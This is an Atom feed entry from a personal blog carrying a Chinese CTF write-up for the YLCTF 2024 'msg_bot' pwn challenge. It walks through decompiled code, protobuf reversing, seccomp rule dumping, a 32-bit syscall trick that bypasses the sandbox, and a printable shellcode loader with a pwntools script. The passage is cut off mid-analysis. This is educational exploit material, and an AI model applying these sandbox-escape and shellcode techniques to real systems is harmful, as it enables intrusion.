<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C_LBY&#39;s BLOG</title>
  
  
  <link href="https://c-lby.top/atom.xml" rel="self"/>
  
  <link href="https://c-lby.top/"/>
  <updated>2024-10-23T15:26:48.372Z</updated>
  <id>https://c-lby.top/</id>
  
  <author>
    <name>鎏柏鱼</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>『YLCTF 源鲁杯 2024』 msg_bot</title>
    <link href="https://c-lby.top/2024/10/12/YLCTF-msgbot-protobuf/"/>
    <id>https://c-lby.top/2024/10/12/YLCTF-msgbot-protobuf/</id>
    <published>2024-10-12T11:32:45.000Z</published>
    <updated>2024-10-23T15:26:48.372Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_1389</span><span class="params">(<span class="type">double</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  isnan(a1);</span><br><span class="line">  v2 = rand();</span><br><span class="line">  result = mmap((<span class="type">void</span> *)(v2 % <span class="number">0x7FFFFFFF</span>), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  dest = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请了一块mmap地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_164B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;botmsg: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  qword_4058 = sub_199E(<span class="number">0LL</span>, v1, buf);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4058 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;format error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(qword_4058 + <span class="number">24</span>) == <span class="number">3735928559LL</span> &amp;&amp; *(_QWORD *)(qword_4058 + <span class="number">32</span>) == <span class="number">195939070LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;format checked.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *(_QWORD *)(qword_4058 + <span class="number">24</span>) == <span class="number">3235839725LL</span> &amp;&amp; *(_QWORD *)(qword_4058 + <span class="number">32</span>) == <span class="number">4027448014LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_15B2(*(_QWORD *)(qword_4058 + <span class="number">48</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*(_QWORD *)(qword_4058 + <span class="number">40</span>));</span><br><span class="line">    sub_1461();</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(qword_4058 + <span class="number">40</span>) &lt;= <span class="number">0xC7</span>uLL &amp;&amp; v1 &lt;= <span class="number">0xC7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, *(<span class="type">const</span> <span class="type">void</span> **)(qword_4058 + <span class="number">48</span>), *(_QWORD *)(qword_4058 + <span class="number">40</span>));</span><br><span class="line">      ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nothing.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_199E就是解包函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_15B2</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 - <span class="number">1</span> + a1) == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 - <span class="number">1</span> + a1) = <span class="number">0</span>;</span><br><span class="line">    v3 = a2 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)((<span class="type">int</span>)i + a1) &lt;= <span class="number">31</span> || *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oops!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以给传入shellcode，但是要求在可见字符范围内。并且开了沙盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1461</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  v43 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">53</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">1</span>;</span><br><span class="line">  v10 = <span class="number">0x40000000</span>;</span><br><span class="line">  v11 = <span class="number">21</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">6</span>;</span><br><span class="line">  v14 = <span class="number">-1</span>;</span><br><span class="line">  v15 = <span class="number">21</span>;</span><br><span class="line">  v16 = <span class="number">5</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="number">21</span>;</span><br><span class="line">  v20 = <span class="number">4</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">1</span>;</span><br><span class="line">  v23 = <span class="number">21</span>;</span><br><span class="line">  v24 = <span class="number">3</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">5</span>;</span><br><span class="line">  v27 = <span class="number">21</span>;</span><br><span class="line">  v28 = <span class="number">2</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">37</span>;</span><br><span class="line">  v31 = <span class="number">21</span>;</span><br><span class="line">  v32 = <span class="number">1</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">231</span>;</span><br><span class="line">  v35 = <span class="number">6</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v38 = <span class="number">0</span>;</span><br><span class="line">  v39 = <span class="number">6</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">2147418112</span>;</span><br><span class="line">  v1 = <span class="number">10</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> v43 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行shellcode。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h3><p>首先是程序要求以protobuf格式进行输入。protobuf环境安装看我的<a href="https://c-lby.top/2024/10/11/protobuf-install/">这篇文章</a>。接下来先逆向proto数据格式。不清楚怎么逆向的，可以先看Real返璞归真师傅的<a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">文章</a>.</p><p>我们打开IDA-view视图，按ctrl+s，找到.data.rel.ro段。<img src="https://c-lby.top/images/2024YLCTF-1/proto%E5%AD%97%E6%AE%B5.png" alt="proto字段"></p><p>在0x3C68偏移处可以看到proto名字叫msgbot，package名字是bot，一共3个字段。根据0x3C98处的指针跟进到字段表。</p><p><img src="https://c-lby.top/images/2024YLCTF-1/bot%E5%AD%97%E6%AE%B5%E8%A1%A8.png" alt="bot字段表"></p><p>第一个字段是msgid，1是字段的id，3说明字段的label是none(同时说明syntax是3)，第二个3说明字段的类型是int64，0x18说明这个字段在proto里面的偏移是0x18。以此类推。0xF的类型是bytes。于是就可得到bot.proto:</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax=<span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> bot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">msgbot</span> &#123;</span><br><span class="line">    <span class="type">int64</span> msgid=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int64</span> msgsize=<span class="number">2</span>;</span><br><span class="line">    <span class="type">bytes</span> msgcontent=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>protoc --python_out=. bot.proto</code>生成python文件用来写脚本。</p><p>根据主逻辑里给出来的条件判断，写出前置脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bot_pb2 <span class="keyword">as</span> pb <span class="comment">#protobuf生成的文件</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64 <span class="comment">#用来生成可见字符shellcode的工具</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e = ELF(&#x27;./msg_bot&#x27;)</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./msg_bot&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">41741</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;botmsg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">msg = pb.msgbot()</span><br><span class="line">msg.msgid = <span class="number">0xC0DEFEED</span></span><br><span class="line">msg.msgsize = <span class="number">0xF00DFACE</span></span><br><span class="line">msg.msgcontent = <span class="string">b&#x27;?&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(msg.SerializeToString()))</span><br></pre></td></tr></table></figure><h3 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h3><p>当传输的数据满足一定条件时，就能进到执行shellcode的路径，但是同时这条路上程序也开了个沙盒。这道题比较恶心的点是，沙盒是在分支里才开启的，需要输入特定的数据，用seccomp-tools没法直接dump出来，因为在终端没法直接输入不可见字节。也许用脚本或者其他方式能够dump出来，但是我不会，所以用了个比较蠢但是一定对的方法来看沙盒规则：根据伪代码自己写一个程序。其实如果对prctl熟悉的话，也许可以直接从伪代码看出来规则，但是我不熟悉，在网上查了很久才看懂prctl的用法，这里不展开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">install_filter</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</span><br><span class="line">        &#123;<span class="number">0x35</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0x25</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xe7</span>&#125;,</span><br><span class="line">        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="comment">// BPF_JUMP(21, 59, 2, 1),</span></span><br><span class="line">        <span class="comment">// BPF_JUMP(21, 11, 1, 0),</span></span><br><span class="line">        <span class="comment">// BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span></span><br><span class="line">        <span class="comment">// BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, <span class="number">2</span>, &amp;prog);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hey there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    install_filter();</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后再用seccomp-tools导出沙盒规则，就好看了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">seccomp-tools dump ./tmp</span></span><br><span class="line">hey there!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0003</span><br><span class="line"> 0002: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0003: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000025  if (A == alarm) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>open被禁了，但是32位下的open调用号是5号，刚好是64位fstat的调用号，并且这个沙箱并没有限制架构，所以可以转成32位后调用open，再转回64位执行read和write。</p><h3 id="shellcode（详细调试及手搓教程）"><a href="#shellcode（详细调试及手搓教程）" class="headerlink" title="shellcode（详细调试及手搓教程）"></a>shellcode（详细调试及手搓教程）</h3><h4 id="关掉alarm防止影响调试"><a href="#关掉alarm防止影响调试" class="headerlink" title="关掉alarm防止影响调试"></a>关掉alarm防止影响调试</h4><p><code>sed -i s/alarm/isnan/g ./msg_bot</code></p><p>将程序中的alarm替换为isnan，isnan函数不会影响程序的流程，这样就不会被alarm影响调试了。</p><h4 id="ae64和出现的问题"><a href="#ae64和出现的问题" class="headerlink" title="ae64和出现的问题"></a>ae64和出现的问题</h4><p>这道题还有个限制就是传进去的shellcode需要时可见字符，这里就需要用到一些工具来进行转换。可以用alpha3或者ae64，网上都有详细的介绍，我这里用的是ae64。</p><p>一般来说，要使用转架构的方式绕过沙盒，都需要一段可控地址的可执行内存，一般是使用mmap来获取，但是这个沙盒并没有给mmap。仔细观察发现执行shellcode的时候使以<code>call rax</code>的方式进行跳转的，而我们的shellcode就写在一段可执行的mmap内存里。地址是随机生成的，但是都控制在了四个字节以内。这意味这，虽然地址我们不能直接获取，但是保证了一定是一个32位也可用的地址，所以在手搓shellcode的时候可以注意从rax中获取地址。</p><p>ae64可以将一段64位汇编的shellcode转成只有可见字符组成的shellcode。其本质功能是生成一段shellcode，它可以通过各种计算将我原本的shellcode还原出来到内存中，并跳转执行。但是在使用调试过程中发现两个问题。假如我的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push rax</span><br><span class="line">pop rsi</span><br><span class="line">xor eax, eax</span><br><span class="line">push 0x7a</span><br><span class="line">pop rdx</span><br><span class="line">xor edi, edi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>这很明显是一个read的系统调用。第一个问题可能是一个bug：ae64的shellcode执行完后，我的代码还原完毕，但是我发现我的syscall被还原成了不知道什么东西（punpckhdq那坨），导致这个read执行不成功。<img src="https://c-lby.top/images/2024YLCTF-1/%E9%94%99%E8%AF%AF%E8%BF%98%E5%8E%9F%E7%9A%84%E4%BB%A3%E7%A0%81.png" alt="错误还原的代码"></p><p>解决方法是，在syscall之前写几个nop。猜测可能和一定倍数对齐有关，没有深入探究。</p><p>第二个问题是，原本存在rax中的内存地址，会被还原代码的shellcode给破坏掉。也就是说，等到执行我的代码的时候，push rax也获取不到mmap的地址了。<img src="https://c-lby.top/images/2024YLCTF-1/rax%E8%A2%AB%E7%A0%B4%E5%9D%8F.png" alt="rax被破坏"></p><p>不过仔细观察可以发现这时候rsp刚好指向mmap出来的地址加上一定偏移。经过几次验证可以发现mmap的地址一定会以\x00结尾，并且rsp指向的这个地址和这块内存的基址偏移是固定的，所以我们就不需要push再pop了，直接pop rsi就可以了。</p><h4 id="写一个shellcode-loader"><a href="#写一个shellcode-loader" class="headerlink" title="写一个shellcode loader"></a>写一个shellcode loader</h4><p>结合前面两个问题，我们可以写出这段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sc1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">push 0x96</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">msg.msgcontent = AE64().encode(shellcode, strategy=<span class="string">&#x27;small&#x27;</span>) <span class="comment">#用AE64生成一段最短可见字符的生成sc1的shellcode</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>诶对了，为什么我们要写这个read的syscall呢？因为程序还限制了传入的shellcode长度不能超过199。其实准确来说是184，因为还要算上protobuf前面的数据内容。想要把整个完整shellcode都用ae64打包成可见字符shellcode是不可能的，光是上面这段代码打包后的数据包总长度就达到了157字节，所以最好的方法就是先写一个shellcode loader，然后再传入真正orw的shellcode，这样既没有长度也没有可见字符的限制。</p><h4 id="写一段32位的open系统调用"><a href="#写一段32位的open系统调用" class="headerlink" title="写一段32位的open系统调用"></a>写一段32位的open系统调用</h4><p>接下来我们要动调查看rsi是多少，我们接下来读入的第二段shellcode是从哪里开始读入的，rip下一步会从哪里开始执行，来确定接下来的shellcode该怎么写。pwndbg断点在mmap的地址可能会飞过去，所以我们断点在<code>call rax</code>(0x17C9)前，再单步执行到syscall处。<img 